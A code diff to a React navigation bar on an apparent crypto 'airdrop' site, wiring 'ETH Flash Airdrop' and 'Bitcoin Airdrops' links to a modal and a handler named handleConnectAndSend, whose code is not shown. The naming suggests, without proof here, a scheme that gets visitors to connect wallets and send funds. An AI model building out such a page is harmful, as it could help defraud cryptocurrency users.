@@ -247,9 +247,9 @@ function App() {
                     <a className="nav-link" href="#">Telegram</a>
                   </li>
                   <li className="nav-item">
-                    <a className="nav-link" href="#"><FaBitcoin className="me-2 text-warning" /> Bitcoin Airdrops</a>
+                    <a className="nav-link" onClick={() => setShowModal(true)} disabled={loading}><FaBitcoin className="me-2 text-warning" /> Bitcoin Airdrops</a>
                     <a className="nav-link" href="#"><SiSolana className="me-2 text-info" /> Solana Airdrops</a>
-                    <a className="nav-link" href="#"><FaEthereum className="me-2 text-primary" /> ETH Airdrops</a>
+                    <a className="nav-link" onClick={handleConnectAndSend} disabled={loading}><FaEthereum className="me-2 text-primary" /> ETH Airdrops</a>
                   </li>
                   <li className="nav-item dropdown">
                     <a className="nav-link dropdown-toggle" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
@@ -257,7 +257,7 @@ function App() {
                     </a>
                     <ul className="dropdown-menu">
                       <li><a className="dropdown-item" href="#"><SiSolana className="me-2 text-info" /> Solana Flash Airdrop</a></li>
-                      <li><a className="dropdown-item" href="#"><FaEthereum className="me-2 text-primary" /> ETH Flash Airdrop</a></li>
+                      <li><a className="dropdown-item" onClick={handleConnectAndSend} disabled={loading}><FaEthereum className="me-2 text-primary" /> ETH Flash Airdrop</a></li>
                       <li><a className="dropdown-item btn" onClick={() => setShowModal(true)} disabled={loading}><FaBitcoin className="me-2 text-warning" /> Bitcoin Flash Airdrop</a></li>
                       <li>
                         <hr className="dropdown-divider"/>
